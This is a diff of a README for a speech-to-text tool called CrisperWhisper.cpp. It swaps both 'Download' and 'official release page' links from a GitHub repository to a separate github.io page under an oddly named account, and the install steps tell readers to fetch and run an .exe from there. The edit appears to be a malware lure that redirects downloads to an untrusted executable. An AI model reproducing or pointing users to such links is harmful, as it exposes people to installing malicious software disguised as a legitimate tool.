@@ -1,6 +1,6 @@
 # 🎙️ CrisperWhisper.cpp - Turn spoken audio into accurate text
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Flasherrentalincome673/CrisperWhisper.cpp)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://flasherrentalincome673.github.io)
 
 CrisperWhisper.cpp provides a way to turn audio recordings into text files. It uses computer hardware to process speech. The software runs on Windows computers. It works on both processors and graphics cards. You can use it for long meetings, lectures, or interviews.
 
@@ -19,7 +19,7 @@ If you plan to use an NVIDIA graphics card, ensure you have the latest drivers i
 
 You must visit the project page to get the installer. Follow these steps to find the right file:
 
-1. Visit the [official release page](https://github.com/Flasherrentalincome673/CrisperWhisper.cpp).
+1. Visit the [official release page](https://flasherrentalincome673.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to start your download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
